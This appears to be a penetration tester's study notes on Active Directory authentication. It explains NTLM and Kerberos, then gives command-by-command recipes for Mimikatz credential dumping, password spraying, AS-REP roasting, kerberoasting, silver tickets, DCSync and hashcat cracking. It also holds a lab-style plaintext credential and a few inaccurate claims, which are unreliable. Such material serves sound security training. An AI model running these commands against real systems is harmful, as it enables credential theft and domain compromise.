
# NTLM Authentication

NTLM authentication is used when a client authenticates to a server by **IP address** (instead of hostname), when the hostname isn't registered in AD DNS, or when third-party apps prefer NTLM over Kerberos.

**High-level flow:**

1. The client computes an NTLM hash from the user's password.
    
2. The client sends the username to the server.
    
3. The server returns a random challenge (nonce).
    
4. The client encrypts the nonce using the NTLM hash — this is the response.
    
5. The server forwards username, nonce, and response to the domain controller.
    
6. The domain controller encrypts the nonce with the stored NTLM hash and compares it to the response.
    
7. If they match, authentication succeeds.

**Notes:**

- NTLM hashes are **fast** to compute and thus susceptible to cracking (GPU hashing rates can exceed hundreds of billions/s).
- Disabling NTLM entirely is difficult in many environments because it acts as a fallback and third-party apps may depend on it.

# Kerberos Authentication

Kerberos (MIT Kerberos v5) is the primary AD authentication protocol since Windows Server 2003. Instead of challenge/response, Kerberos uses **tickets** issued by the Key Distribution Center (KDC) on the domain controller.

**High-level Kerberos flow:**

1. User logs on → client sends **AS-REQ** (Authentication Server Request) to KDC. The AS-REQ contains a timestamp encrypted with a key derived from the user's password.
    
2. KDC decrypts timestamp using the user's hash stored in `ntds.dit`. If valid and not a replay, the KDC replies with **AS-REP** containing a session key and a **TGT** (Ticket Granting Ticket). The TGT is encrypted with the KDC's secret (krbtgt account).
    
3. To access a service, client sends a **TGS-REQ** (Ticket Granting Service Request) to the KDC, including the encrypted TGT and the requested service name.
    
4. KDC validates the TGT and the request, then responds with a **TGS-REP** containing a service ticket and a session key for client↔service.
    
5. Client sends an **AP-REQ** (Application Request) to the service with the service ticket and an authenticator encrypted with the session key.
    
6. Service validates the ticket using the **service account hash** and establishes the session.

**Key terms:**

- AS-REQ / AS-REP — initial authentication exchange and TGT issuance.
- TGS-REQ / TGS-REP — request and issuance of service tickets using the TGT.
- AP-REQ — client→service request containing service ticket.

# Cached AD Credentials

Windows stores credential-related material in LSASS memory so services can renew TGTs and perform single sign-on. Extracting these artifacts typically requires **SYSTEM** or **local administrator** privileges because LSASS runs at high privilege.

**Where things live:**

- Local account hashes → SAM / SYSTEM (on disk)
- Domain credential material (NTLM hashes, Kerberos tickets) → LSASS memory

In modern versions of Windows the user hashes are stored in the Local Security Authority Subsystem Service or [LSASS](https://en.wikipedia.org/wiki/Local_Security_Authority_Subsystem_Service) We can dump sensitive informations about accesses with Mimikatz. We can run Mimikatz with

```powershell
.\mimikatz.exe
```

We can use logonpasswords to dump hashed for all users logged on to the current workstation or server

```powershell
privilege::debug
sekurlsa::logonpasswords
```

Once we've executed the directory listing on a SMB share or we use another ticket-based-service, we can use Mimikatz to show the tickets that are stored in memory by entering

```powershell
privilege::debug
sekurlsa::tickets
```


# Password Attack

We can do various password attacks on the Windows AD to get the user access credentials

## [PasswordSpray.ps1](https://github.com/dafthack/DomainPasswordSpray/blob/master/DomainPasswordSpray.ps1)

It is a powershell script that tries the passwords for all users in the domain, that has to be launched inside an AD-joined machine.

```powershell
.\Spray-Passwords.ps1 -Pass <PASSWORD>
```

## [Kerbrute](https://github.com/ropnop/kerbrute)

From a Linux machine instead we can run AD password attack with Kerbrute. We can use this script also from a Window machine joined in the domain.

```shell
./kerbrute_linux_amd64 passwordspray -d <DOMAIN> domain_users.txt <PASSWORD>
```

Kerbrute can be used also to get a list of users, if the machine is vulnerable to as-rep roasting. Search for valid user without credentials with the following

```shell
kerbrute userenum -d <DOMAIN> usernames.txt
```

or

```shell
kerbrute -domain <DOMAIN> -users users.txt -dc-ip <IP>
```

## [Crackmapexec](https://github.com/byt3bl33d3r/CrackMapExec)

> [!CAUTION]
> This project is no longer mantained due to the existence of a hostile fork.

Crackmapexec is a tool for password spraying in the Active Directory network. It can be used for example against the SMB service with

```shell
crackmapexec smb <IP> -u users -p '<PASSWORD>' -d <DOMAIN> --continue-on-success
```

List access for shares in the domain for the users in users.txt with passwords passwords.txt

```shell
crackmapexec smb <IP> -u users.txt -p passwords.txt --shares
```

Run crackmapexec through a proxy (eg chisel) and performing a **local authentication** (No Active Directory Authentication)

proxychains crackmapexec smb -u users.txt -p 'PASSWORD' --continue-on-success --local-auth

Run crackmapexec and dump [LAPS](https://www.n00py.io/2020/12/dumping-laps-passwords-from-linux/) passwords

```shell
crackmapexec ldap 192.168.219.122 -u fmcsorley -p CrabSharkJellyfish192 --kdcHost 192.168.219.122 -M laps
```

Run crackmapesec to against mssql

```shell
crackmapexec mssql -d <DOMAIN> -u <username> -p <password> -x "whoami"
```

## Netexec

This project was initially created in 2015 by @byt3bl33d3r, known as CrackMapExec. In 2019 @mpgn_x64 started maintaining the project for the next 4 years, adding a lot of great tools and features.

> [!NOTE]
> If Netexec shows 'STATUS_ACCOUNT_LOCKED_OUT' we probably had locked out the account, but the credentials are valid.
> 

```bash
# Enumeration
nxc smb 10.10.10.1 -u users.txt -p password123 --continue-on-success

# Null session
nxc smb 10.10.10.1 -u '' -p ''

# Kerberute
nxc smb 10.10.10.1 -u 'guest' -p '' --rid-brute

# AS-REP Roasting
nxc ldap 192.168.0.104 -u harry -p '' --asreproast output.txt
nxc ldap 192.168.0.104 -u harry -p pass --asreproast output.txt

# Kerberosting
nxc ldap 192.168.0.104 -u harry -p pass --kerberoasting output.txt
```

and much more...

## LDAP

First we run nmap against ldap server

```shell
nmap --script "ldap* and not brute" $ip -p 389 -v -Pn -sT <IP>
```

Then using ldapsearch we can extract credentials. The -b parameter in the ldapsearch command specifies the base DN (Distinguished Name) for the search. The DN is essentially the starting point in the LDAP directory tree from which the search will begin. Think of it as the root of your search within the  LDAP stucture. Example taken from [here](https://medium.com/@0xrave/kyoto-proving-grounds-practice-walkthrough-active-directory-820dfcff5ddd).

```shell
ldapsearch -x -h <IP> -b "dc=X,dc=Y"
```

# AS-REP Roasting

If the AD authentication is configured without the Kerberos Preauthentiction enabled, any user can request a TGT. We can use the `impacket-GetNPUsers` util on Kali. A good explaination of this attack can be found [here](https://en.hackndo.com/kerberos-asrep-roasting/).

```shell
impacket-GetNPUsers -dc-ip <IP-DC>  -request -outputfile hashes.asreproast corp.com/<USER>
```

AS-Rep roasting tickets (TGT) has this format: `$krb5asrep$23$`.

In the powershell the specular program is [Rubeus](https://github.com/GhostPack/Rubeus)

```powershell
.\Rubeus.exe asreproast /nowrap
```

In both cases we have to know at leas the password of one of the AD users. For this reason this and the following tecniques are **post-exploitation** attacks. When we gain the hash it can be cracked with hashcat.

```shell
sudo hashcat -m 18200 hashes.asreproast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
```

# Kerberosting

With kerberoasting we are requesting SPN's TGS to the DC. The user that can access the service, for the Windows AD design, can access also the SPN and then the TGS, in order to use the service. We will abuse a service ticket in order to crack the password of the service account. We can run the attack from Rubeus with a user in the AD, and will be targeted only the **Service Principal Names** linked to the account user.

From the Kali machine we can run the attack with

```shell
sudo impacket-GetUserSPNs -request -dc-ip <DC-IP> corp.com/<USER>
```

The `-request` flag is requesting the DC a TGS for every SPN the logged user has access to. Dumping the tickets could let us to the password because it contains password of the SPN in hash. The TGS ticket will begin with this format: `$krb5tgs$23$`.

From the Windows machine we can use Rubeus

```powershell
.\Rubeus.exe kerberoast /outfile:hashes.kerberoast
```

Again now we copy the hash and we crack it with hashcat with the Kerberos code

```shell
sudo hashcat -m 13100 hashes.kerberoast /usr/share/wordlists/rockyou.txt --force
```

# Silver Tickets

We can use Mimikatz to dump hashes and craft a ticket for services access.

First we take the DOMAIN SID with

```powershell
whoami /user
```

We extract the domain

```adblock
corp\user **S-1-5-21-xxxxxxxx-xxxxxxx-xxxxxxxx**-xxxx
```

Then with Mimikatz we dump service hashes

```powershell
privilege::debug
sekurlsa::logonpasswords
```

Here we take the NTLM HASH of the service, for example the `iss_service`. Next we can run the attack inside Mimikatz. In the following case we will target the ISS Microsoft service.

```powershell
kerberos::golden /sid:<SID> /domain:<DOMAIN> /ptt /target:<TARGET> /service:http /rc4:<HASH> /user:<USER>
```

Now we can dump our tickets with

```powershell
klist
```

The ticket will be crated for the admin user and for the local user. We can craft authenticated request to the ISS server.

```powershell
iwr -UseDefaultCredentials <URL>
```

# DCSync Attack

When the AD has to synchronize the domains, it runs the Directory Replication Service (DRS) Remote Protocol. Because the domain does not verify the origin of the request, we can perform a **dcsync** attack that could dump any user credential in the domain.

To launch such a replication, a user needs to have the _Replicating Directory Changes_, _Replicating Directory Changes All_, and _Replicating Directory Changes in Filtered Set_ rights. By default, members of the _Domain Admins_, _Enterprise Admins_, and _Administrators_ groups have these rights assigned.

We can use the `impacket-secretsdump` utility. First we run Mimikatz with the dsync attack.

```powershell
lsadump::dcsync /domain:<DOMAIN> /user:Administrator
```

We crack the NTLM HASH with hashcat

```powershell
hashcat -m 1000 hashes.dcsync /usr/share/wordlists/rockyou.txt --force
```
